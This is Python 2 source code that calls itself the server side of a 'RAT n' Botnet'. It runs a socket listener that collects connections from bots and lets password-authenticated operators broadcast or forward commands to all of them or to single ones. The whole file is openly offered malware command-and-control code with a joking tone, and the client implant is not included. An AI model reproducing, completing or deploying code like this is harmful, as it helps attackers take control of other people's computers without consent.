# A Python RAT n' Botnet
#  by Landon in Python2
#    SERVER-SIDE C0DE

import socket, hashlib, thread

def hash(string):
    return hashlib.sha512(
        string.encode('utf-8')
    ).digest()

password    = hash( raw_input("Password? > ") )
proles      = {} # An IP to Connection dictionary.
innerParty  = [] # List of Authorized SIDs.

hostName, portNumber = "127.0.0.1" or socket.gethostname(), 8080

serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket . bind(( hostName, portNumber )) # To-do: PORT CHANGE LATER
serverSocket . listen(10)

def broadcast(message):
    for ip in proles:
        proles[ip].sendall(message)

def clientHandler(connection, ip):
    proles[ip] = connection
    message = ""
    while message != "kill":
        message = connection.recv(2048).split(" ", 1)

        if ip in innerParty:
            if message[0] == "all":
                broadcast(message[1])
            else:
                proles[message[0]].sendall(message[1])

        elif message[0] == "authenticate":
            if hash(message[1]) == password:
                innerParty.append(ip)
            else:
                print( "Attempt from : " + ip )

    connection.close()

turnedOn = True
while turnedOn: # *Wink wink nudge nudge*
    (clientSocket, address) = serverSocket.accept()
    thread.start_new_thread( 
        clientHandler,
        ( clientSocket, address[0] )
    )
    print( address )